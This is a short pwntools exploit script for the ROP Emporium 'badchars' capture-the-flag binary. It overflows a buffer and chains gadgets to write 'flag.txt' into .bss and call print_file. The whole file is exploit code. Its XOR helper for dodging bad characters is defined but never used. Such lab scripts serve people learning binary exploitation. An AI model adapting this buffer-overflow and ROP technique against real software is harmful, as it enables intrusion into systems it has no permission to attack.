#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys

# Naive attack like write4 technic
# break after the read in pwnme
gs='''
b *pwnme+268
c
'''

# Gadgets 
# pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_r12345=0x40069c
# mov qword ptr [r13], r12 ; ret
write_r13r12=0x400634
# pop rdi ; ret
pop_rdi = 0x4006a3

def w_write(addr, data):
    r=b""
    if type(data) == str:
        data=data.encode()
    for i in range(0,len(data),8):
        r += p64(pop_r12345)
        r += data[i:i+8]
        r += p64(addr+i)
        r += p64(0)
        r += p64(0)
        r += p64(write_r13r12)
    return r


def xorchain(chain, bytes, mask):
    r=b""
    for i,c in enumerate(chain):
        if bytes&0x80:
            c=c^mask
        r+=chr(c).encode()
        bytes= bytes<<1
    return r

# Offset to retrn address
offset=0x28

# Set up pwntools for the correct architecture
elf =  ELF('badchars')
context.binary=elf

print_file=elf.plt['print_file']

bss = 0x00601038

PL =b"A"*offset
PL+=w_write(bss,"flag.txt")
PL+=p64(pop_rdi)
PL+=p64(bss)
PL+=p64(print_file)

io = process([elf.path])
if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)

# io.recvuntil(b"> ")
io.sendline(PL)
io.interactive()

